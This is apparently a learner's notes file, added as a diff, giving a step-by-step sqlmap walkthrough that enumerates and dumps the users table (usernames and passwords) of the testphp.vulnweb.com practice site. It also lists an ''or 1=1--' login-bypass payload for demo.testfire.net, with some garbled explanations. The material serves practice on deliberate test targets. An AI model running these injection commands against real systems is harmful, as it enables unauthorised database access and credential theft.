@@ -1,0 +1,117 @@
+
+=================================================================
+open kali os
+
+terminal
+sqlmap 
+sqlmap --update
+sqlmap --help              [commands]
+testphp.vulnweb.com        [ open source test website]
+[for find parameter- copy  [ctrl+c and past[ctrl+shift+p]
+ in sql map]
+----------------------
+sudo apt-get update
+sudo apt-get upgrade
+or
+sudo apt update
+sudo apt upgrade
+
+sudo apt install sqlmap
+
+sqlmap --help              [ show all sqlmap cmd]
+
+sqlmap -u  http://testphp.vulnweb.com/ --crawl 2
+-------------------------------------------------- 
+[https://www.contrive.mobi/aviorapi/HTTPMETHODS.html#:~:text=The%20primary%20or%20most%2Dcommonly,but%20are%20utilized%20less%20frequently.]
+--------------------------------------------------
+GET parametter you recived like - 
+[http://testphp.vulnweb.com/artists.php?artist=1]
+open this in browser [check it is running or not]
+ 
+--------------------------------------------------
+use found url here
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" --dbs  
+
+[in given link it will find/extract- database name, payload ]
+[now we have - parameter, database, payload]
+---------------------------------------------------
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" -D acuart -tables
+
+[you will found out some tables table then]
+
+-----------------------------------------
+[ select anyone table from output, for exract columns use
+[--T users --columns]]
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" -D acuart -T users --columns
+
+------------------------------------------------
+[we received columns so extract -  uname [-C uname --dump]]
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" -D acuart -T users -C uname --dump
+
+--------------------------------------------------
+[we received columns so extract -  pass [-C pass --dump]]
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" -D acuart -T users -C pass --dump
+  
+--------------------------------------------------
+[let see the output/function are correct or not]
+[go website -http://testphp.vulnweb.com/login.php ]
+---
+with sql_injection find the username and password
+username-test, password-test 
+====================================================
+----------------------------------------------------
+----------------------------------------------------
+----------------------------------------------------
+====================================================
+SQL injection
+
+SQL injection is a technique to attach data-driven 
+applications. This attack can bypass a firewall and can affect a fully 
+patched system.
+
+through SQL injections, attackers obtain unauthorized 
+access to a database and can create READ, UPDATE, ALTER, 
+and DELETE data stored in the backend Databases. 
+
+mostly all SQL databases like - Oracle, MySQL, post-SQL, 
+MySQL server and ms-excel are potentially vulnerable to SQL 
+injection attack.....
+
+when it performs then it will provide you access to the
+sensitive information stored in the database. ssn no, 
+credit card details, etc... 
+--------------------------------------------------------
+https://www.geeksforgeeks.org/sql-ddl-dql-dml-dcl-tcl-commands/
+========================================================
+web application -
+
+
+1. Experiment 
+
+demo.testfire.net
+sign in
+ 
+username  {1=1--}  
+[write a query that goes to the database and returns true value ]
+[1=1-- means whatever/random we can put as pwd]
+[so do not check the value just it will comnt]
+
+password   anything
+[error]
+
+
+'or 1=1-- [or means both conditions are true, then it will run]
+password   anything
+
+
+---------------------------
+haker use some how true ---
+syntax -
+select*from user where '1'='1';
+----------------------
+=================================================================
+=================================================================
